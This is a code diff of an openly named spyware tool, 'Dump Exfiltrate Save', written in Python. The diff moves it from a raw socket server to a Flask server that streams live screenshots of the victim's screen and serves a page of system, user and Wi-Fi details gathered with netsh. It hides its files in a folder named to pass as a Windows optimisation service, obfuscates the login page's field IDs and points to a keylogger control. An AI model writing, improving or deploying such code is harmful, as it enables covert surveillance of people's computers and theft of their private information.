@@ -5,8 +5,15 @@ import time
 import socket
 import io
 from collections import deque
+from flask import Flask, Response, render_template_string, send_file, jsonify
 import mss
 from PIL import Image
+import platform
+import psutil
+import subprocess
+
+# Create Flask app
+app = Flask(__name__)
 
 # Create directory function
 def make():
@@ -16,7 +23,7 @@ def make():
     screenShareDir = f"C:\\Users\\{user_login}\\WindowsOptimisationService"
     # Make the main directory
     os.makedirs(screenShareDir, exist_ok=True)
-    # Change the direcotry path
+    # Change the directory path
     os.chdir(screenShareDir)
 
 # Capture images function
@@ -40,68 +47,42 @@ def capture_images():
                 # Append the image data to the 'images' deque 
                 images.append(output.getvalue())
                 # If the number of images exceeds 5, remove the oldest image from the deque
-                if len(images) > 2:
+                if len(images) > 5:
                     images.popleft()
             # Calculate the elapsed time for the current iteration
             elapsed = time.time() - start
             # Sleep for the remaining time to maintain a frame rate of 10 FPS
-            time.sleep(max(0, 1/10 - elapsed))
+            time.sleep(max(0, 1/120 - elapsed))
 
 # Get local IP function
 def get_local_ip():
     return socket.gethostbyname(socket.gethostname())
 
-# Define socket host 
-SERVER_HOST = get_local_ip()
-print(f"Server IP: {SERVER_HOST}")
-# Define socket host 
-SERVER_PORT = 31338
-print(f"Server port: {SERVER_PORT}")
-
-# Create socket server
-server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-# Bind socket server
-server_socket.bind((SERVER_HOST, SERVER_PORT))
-# Start listening for clients
-server_socket.listen(1)
-print(f'Listening on port {SERVER_PORT} | IP {SERVER_HOST}')
-
 # Define the global images variable
 images = deque(maxlen=5)
 
-# Handle request function
-def handle_request(request):
-    global images  # Use the global images variable
-    # Parse the request
-    lines = request.splitlines()
-    if len(lines) > 0:
-        request_line = lines[0]
-        method, path, _ = request_line.split()
+SERVER_HOST = get_local_ip()
+SERVER_PORT = 31338
 
-        # Handle different paths
-        if path == '/':
-            response_body = f"""<!DOCTYPE html>
+# HTML templates
+login_page = f"""<!DOCTYPE html>
 <html lang="en">
-<!--Start Head-->
 <head>
-    <!--Page Information-->
     <meta charset="UTF-8">
-    <meta name="author" content="Federico">
+    <meta name="author" content="Fedi6431">
     <meta name="description" content="The Project Dump Exfiltrate Save (P-DES) is a project made by Fede to retrieve informations & PC usages">
-    <meta name="copyright" content="Fede 2025©">
+    <meta name="copyright" content="Fedi 2025©">
     <meta name="dc.language" content="ita" scheme="RFC1766">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!--Title -->
     <title>Dump Exfiltrate Save | DES</title>
     <script>
         function checkCredentials() {{
-            var username = document.getElementById("username").value;
-            var password = document.getElementById("password").value;
-            var encodedPassword = btoa(password); // Encodes the password with base64
-            var encodedUsername = btoa(username)
+            var YKMs6nmx7VcV63i = document.getElementById("m2SxXVmW3tWogiS").value;
+            var BeGhkaQXpn4UplY = document.getElementById("ozOSNlUtEYo4mts").value;
+            var hovAsGEJkOG0mIq = btoa(BeGhkaQXpn4UplY); 
+            var KDKl8J3Ih7uU0l2 = btoa(YKMs6nmx7VcV63i)
 
-            if (encodedUsername === "UERFUy1BZG1pbg==" && encodedPassword === "UERFUy1QYXNzd29yZA==") {{
+            if (KDKl8J3Ih7uU0l2 === "UERFUy1BZG1pbg==" && hovAsGEJkOG0mIq === "UERFUy1QYXNzd29yZA==") {{
                 alert("Login successful");
                 window.location.replace("http://{SERVER_HOST}:{SERVER_PORT}/4ee1711430410e5f2ec9d8188ac1f134");
             }} else {{
@@ -110,17 +91,16 @@ def handle_request(request):
         }}
     </script>
 </head>
-<!--End Head-->
 <body>
     <h2>Admin Login</h2>
     <form onsubmit="event.preventDefault(); checkCredentials();">
         <div>
-            <label for="username">Username:</label>
-            <input type="text" id="username" name="username">
+            <label for="">Username:</label>
+            <input type="text" id="m2SxXVmW3tWogiS" name="">
         </div>
         <div>
             <label for="password">Password:</label>
-            <input type="password" id="password" name="password">
+            <input type="password" id="ozOSNlUtEYo4mts" name="">
         </div>
         <div>
             <button type="submit">Login</button>
@@ -128,41 +108,16 @@ def handle_request(request):
     </form>
 </body>
 </html>"""
-            response_status = "HTTP/1.1 200 OK"
-        elif path == f'/4ee1711430410e5f2ec9d8188ac1f134':
-            response_body = f"""<!DOCTYPE html>
+
+dashboard_page = f"""<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="author" content="Federico">
+    <meta name="author" content="Fedi6431">
     <meta name="description" content="The Project Dump Exfiltrate Save (P-DES) is a project made by Fede to retrieve informations & PC usages">
-    <meta name="copyright" content="Fede 2025©">
+    <meta name="copyright" content="Fedi 2025©">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dump Exfiltrate Save | DES</title>
-    <script>
-        function updateImage() {{
-            const img = document.getElementById('screenshot');
-            img.src = '/image.png?' + new Date().getTime();
-        }}
-        setInterval(updateImage, 100); // 10 FPS
-
-        function saveScreenshot() {{
-            const link = document.createElement('a');
-            link.href = '/download.png';
-            link.download = 'screenshot.png';
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-        }}
-
-        const refreshBtn = document.getElementById("btnRefresh");
-        function handleClick() {{
-            history.go(0);
-        }}
-
-        refreshBtn.addEventListener("click", handleClick);
-
-     </script>
 </head>
 <body>
     <h1>Action available</h1>
@@ -172,9 +127,32 @@ def handle_request(request):
         <li><a href="#Usage">Usage stats</a></li>
     </ol>
     <div id="screenShare">
+        <script>
+            function updateImage() {{
+                const img = document.getElementById('screenshot');
+                img.src = '/image.png?' + new Date().getTime();
+            }}
+            setInterval(updateImage, 100); // 10 FPS
+
+            function saveScreenshot() {{
+                const link = document.createElement('a');
+                link.href = '/download.png';
+                link.download = 'screenshot.png';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }}
+
+            const refreshBtn = document.getElementById("btnRefresh");
+            function handleClick() {{
+                history.go(0);
+            }}
+
+            refreshBtn.addEventListener("click", handleClick);
+        </script>
         <h1>Screen share</h1>
         <button type="button" onclick="saveScreenshot()">Take &#38; Download screenshot from host</button>
-        <button id="btnRefresh" type="button" onclick="updateImage()">Refresh page</button>
+        <button id="btnRefresh" type="button" onclick="location.reload(true)">Refresh page</button>
         <div>
             <img id="screenshot" src="/image.png" alt="Screenshot" />
         </div>
@@ -185,60 +163,69 @@ def handle_request(request):
         <button type="button">Stop keylogger</button>
     </div>
     <div id="Usage">
-        <h1>Usage stats</h1>
-        <button type="button">Check wifi</button>
-        <button type="button">Check public IP</button>
+        <h1>Pc informations</h1>
+        <p>Hey, we have another page for the pc infromations. If you want them go to <a href="/16f0ada2144eaa0b96478073d5e3d78b">this page</a></p>
     </div>
 </body>
 </html>"""
-            response_status = "HTTP/1.1 200 OK"
-        elif path.startswith('/image.png'):
-            if images:
-                response_status = "HTTP/1.1 403 Forbidden"
-                response = f"{response_status}\r\n"
-                return response.encode()
-            else:
-                response_body = "404 Not Found"
-                response_status = "HTTP/1.1 404 Not Found"
-            
-        elif path.startswith('/download.png'):
-            if images:
-                response_status = "HTTP/1.1 200 OK"
-                response_headers = "Content-type: image/png\r\nContent-Disposition: attachment; filename=\"screenshot.png\"\r\n"
-                response = f"{response_status}\r\n{response_headers}\r\n"
-                return response.encode() + images[-1]
-            else:
-                response_body = "404 Not Found"
-                response_status = "HTTP/1.1 404 Not Found"
-        else:
-            response_body = "404 Not Found"
-            response_status = "HTTP/1.1 404 Not Found"
 
-        # Create the response
-        response = f"{response_status}\r\nContent-Length: {len(response_body)}\r\n\r\n{response_body}"
-        return response
-    return "HTTP/1.1 400 Bad Request\r\n\r\n"
+@app.route('/')
+def login():
+    return render_template_string(login_page)
+
+@app.route('/4ee1711430410e5f2ec9d8188ac1f134')
+def dashboard():
+    return render_template_string(dashboard_page)
+
+@app.route('/image.png')
+def image():
+    if images:
+        return Response(images[-1], mimetype='image/png')
+    return "404 Not Found", 404
+
+@app.route('/download.png')
+def download_image():
+    if images:
+        return send_file(io.BytesIO(images[-1]), mimetype='image/png', as_attachment=True, download_name='screenshot.png')
+    return "404 Not Found", 404
+
+import subprocess
+
+@app.route('/16f0ada2144eaa0b96478073d5e3d78b')
+def informations():
+    user_login = os.getlogin()  # Get the current logged-in username
+    wifi_list = scan_wifi()  # Get the list of available Wi-Fi networks
+    system_info = {
+        "Username": user_login,
+        "Operating System": platform.system(),
+        "OS Version": platform.version(),
+        "Architecture": platform.architecture(),
+        "Processor": platform.processor(),
+        "CPU Cores": psutil.cpu_count(logical=False),
+        "Logical CPUs": psutil.cpu_count(logical=True),
+        "Memory": f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB",
+        "Used Memory": f"{psutil.virtual_memory().used / (1024 ** 3):.2f} GB",
+        "Free Memory": f"{psutil.virtual_memory().available / (1024 ** 3):.2f} GB",
+        "Disk Usage": f"{psutil.disk_usage('/').total / (1024 ** 3):.2f} GB",
+        "Used Disk": f"{psutil.disk_usage('/').used / (1024 ** 3):.2f} GB",
+        "Free Disk": f"{psutil.disk_usage('/').free / (1024 ** 3):.2f} GB",
+        "Hostname": socket.gethostname(),  # Get the hostname of the machine
+        "IP Address": get_local_ip(),  # Get the local IP address
+        "WiFi Networks": wifi_list  # List of available Wi-Fi networks
+    }
+    return jsonify(system_info)
+
+def scan_wifi():
+    try:
+        # Execute the command to scan for Wi-Fi networks
+        result = subprocess.check_output(["netsh", "wlan", "show", "all"], encoding='utf-8')
+        return result
+    except Exception as e:
+        return str(e)  # Return the error message if scanning fails
+
 
 if __name__ == "__main__":
     make()
+    images = deque(maxlen=5)
     threading.Thread(target=capture_images, daemon=True).start()
-    try:
-        while True:
-            # Wait for client connections
-            client_connection, client_address = server_socket.accept()
-            print(f'Connection from {client_address}')
-
-            # Get the client request
-            request = client_connection.recv(1024).decode()
-            print(request)
-
-            # Handle the request and get the response
-            response = handle_request(request)
-
-            # Send the response
-            client_connection.sendall(response.encode() if isinstance(response, str) else response)
-            client_connection.close()
-    except KeyboardInterrupt:
-        print("Server is shutting down.")
-    finally:
-        server_socket.close()
+    app.run(host=get_local_ip(), port=31338)
